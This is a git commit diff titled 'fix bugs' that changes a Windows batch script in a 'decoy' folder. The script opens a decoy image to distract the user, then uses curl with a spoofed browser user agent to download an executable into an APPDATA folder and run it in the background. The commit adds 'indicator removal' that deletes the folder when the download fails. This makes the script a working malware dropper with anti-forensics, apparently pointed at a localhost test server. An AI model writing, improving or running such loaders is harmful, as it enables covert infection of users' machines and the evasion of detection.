d985cae1f62205bbb7f3fe1f053f061fd8129d28
Ian G <49762827+the-wandering-photon@users.noreply.github.com>
2023-12-24 12:30:35 +0000

    fix bugs

--- decoy/nested/script.bat
+++ decoy/nested/script.bat
@@ -1,34 +1,31 @@
 @echo off
 setlocal
 
-:: open the decoy
-start "" "./bird2.jpg.png"
-
-:: ping the host to see if its up, if not exit.
-ping -n 1 http://localhost/ > nul
-if %errorlevel% neq 0 {
-    exit /b
-}
+:: open the decoy file
+start "" "./bird3.jpg.png"
 
 :: useragent
 set UserAgent=Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
-
-:: download the file to APPDATA
-curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php
-
-:: check if error connecting
-if %errorlevel% neq 0 {
-    exit /b
-}
 
 :: create folder in APPDATA
 set ZestyChipsFolder=%APPDATA%\ZestyChips
 mkdir "%ZestyChipsFolder%"
 
-:: check file exists (i.e. successful download) if not exit
-if not exist "%ZestyChipsFolder%\ZestyChipsFromURL.exe" {
+:: download the file to APPDATA
+curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php
+
+:: error downloading, indicator removal and quit
+if %errorlevel% neq 0 (
+    rmdir /s /q "%ZestyChipsFolder%"
     exit /b
-}
+)
+
+:: check file exists (i.e. successful download) if not exit
+if not exist "%ZestyChipsFolder%\ZestyChipsFromURL.exe" (
+    :: indicator removal and exit
+    rmdir /s /q "%ZestyChipsFolder%"
+    exit /b
+)
 
 :: execute in background
 start /b "" "%ZestyChipsFolder%\ZestyChipsFromURL.exe"
